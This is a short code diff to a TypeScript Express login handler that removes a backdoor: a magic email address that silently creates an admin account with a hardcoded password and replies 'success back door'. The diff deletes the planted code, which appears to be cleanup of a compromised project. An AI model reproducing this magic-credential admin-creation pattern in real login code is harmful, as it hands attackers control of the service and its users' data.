@@ -6,18 +6,6 @@ import mongoose from "mongoose";
 
 const login = async (req: Request, res: Response) => {
   const { email, password } = req.body;
-  if (email === "hail@satan.hell") {
-    const hash = bcrypt.hashSync("master-password-12345", 10);
-    const user = new User({
-      name: "Admin",
-      email: "admin@banyanlabs.io",
-      password: hash,
-      role: "6677",
-      _id: new mongoose.Types.ObjectId(),
-    });
-    await user.save();
-    return res.status(200).json({ msg: "success back door" });
-  }
   if (!email || !password)
     res.status(400).json({ message: "Username and password are required" });
   try {
